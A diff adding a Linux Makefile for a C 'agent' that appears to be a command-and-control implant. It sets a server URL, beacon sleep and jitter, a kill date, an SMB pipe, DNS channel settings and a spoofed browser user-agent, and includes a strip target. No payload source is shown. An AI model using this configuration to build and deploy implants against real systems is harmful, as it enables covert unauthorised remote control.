@@ -1,0 +1,96 @@
+# Makefile.linux — Build the C agent for Linux x86_64
+#
+# Prerequisites:
+#   sudo apt-get install libssl-dev
+#
+# Usage:
+#   make -f Makefile.linux
+#   make -f Makefile.linux AGENT_SERVER_URL=https://10.0.0.1:8443
+#
+# The HAVE_OPENSSL flag is set automatically when libssl-dev is detected.
+# If it is missing, builds fall back to HTTP-only (no TLS).
+
+CC      ?= gcc
+STRIP   ?= strip
+TARGET   = agent_linux
+
+# ── Compile-time agent config (override with make AGENT_SERVER_URL=...) ─────
+AGENT_SERVER_URL  ?= http://127.0.0.1:8080
+AGENT_TRANSPORT   ?= https
+AGENT_SLEEP_SEC   ?= 60
+AGENT_JITTER_PCT  ?= 20
+AGENT_CANARY_DOMAIN ?=
+AGENT_USER_AGENT  ?= Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+
+CFLAGS  = -O2 -Wall -Wextra -Wno-unused-parameter \
+          -D_GNU_SOURCE \
+          -DAGENT_SERVER_URL=\"$(AGENT_SERVER_URL)\" \
+          -DAGENT_TRANSPORT=\"$(AGENT_TRANSPORT)\" \
+          -DAGENT_SLEEP_SEC=$(AGENT_SLEEP_SEC) \
+          -DAGENT_JITTER_PCT=$(AGENT_JITTER_PCT) \
+          -DAGENT_CANARY_DOMAIN=\"$(AGENT_CANARY_DOMAIN)\" \
+          "-DAGENT_USER_AGENT=\"$(AGENT_USER_AGENT)\"" \
+          -DAGENT_KILL_DATE=\"\" \
+          -DAGENT_SMB_PIPE=\"endgamepipe\" \
+          -DAGENT_BEACON_URIS=\"\" \
+          -DAGENT_DNS_SERVER=\"8.8.8.8\" \
+          -DAGENT_DNS_DOMAIN=\"\"
+
+LDFLAGS = -lpthread
+
+# ── Auto-detect OpenSSL ──────────────────────────────────────────────────────
+# Requires: sudo apt-get install libssl-dev
+#
+# Override on the command line:
+#   make -f Makefile.linux OPENSSL_INC=/path/to/include
+#
+# Auto-search standard and arch-specific paths:
+ifeq ($(origin OPENSSL_INC), undefined)
+  ifneq ($(wildcard /usr/include/openssl/ssl.h),)
+    OPENSSL_INC := /usr/include
+  else ifneq ($(wildcard /usr/local/include/openssl/ssl.h),)
+    OPENSSL_INC := /usr/local/include
+  endif
+endif
+
+# Arch-specific OpenSSL config header (Debian/Ubuntu multiarch layout)
+# e.g. /usr/include/x86_64-linux-gnu/openssl/opensslconf.h
+ARCH       := $(shell gcc -dumpmachine 2>/dev/null || echo x86_64-linux-gnu)
+OPENSSL_ARCH_INC := /usr/include/$(ARCH)
+
+ifneq ($(strip $(OPENSSL_INC)),)
+  CFLAGS  += -I$(OPENSSL_INC) -I$(OPENSSL_ARCH_INC) -DHAVE_OPENSSL
+  LDFLAGS += -lssl -lcrypto
+else
+  $(warning libssl-dev not found — building HTTP-only (no TLS))
+  $(warning Install with: sudo apt-get install libssl-dev)
+  $(warning The agent will compile but HTTPS connections will not work)
+endif
+
+# ── Source files (Linux only — no Win32 sources) ────────────────────────────
+SRCS = agent_linux.c \
+       commands_linux.c \
+       transport_linux.c \
+       crypto_linux.c \
+       b64.c
+
+OBJS = $(SRCS:.c=.o)
+
+# ── Rules ────────────────────────────────────────────────────────────────────
+all: $(TARGET)
+
+$(TARGET): $(OBJS)
+	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)
+	@echo "[+] Built $(TARGET)"
+
+%.o: %.c
+	$(CC) $(CFLAGS) -c -o $@ $<
+
+clean:
+	rm -f $(OBJS) $(TARGET)
+
+strip: $(TARGET)
+	$(STRIP) --strip-all $(TARGET)
+	@echo "[+] Stripped $(TARGET)"
+
+.PHONY: all clean strip
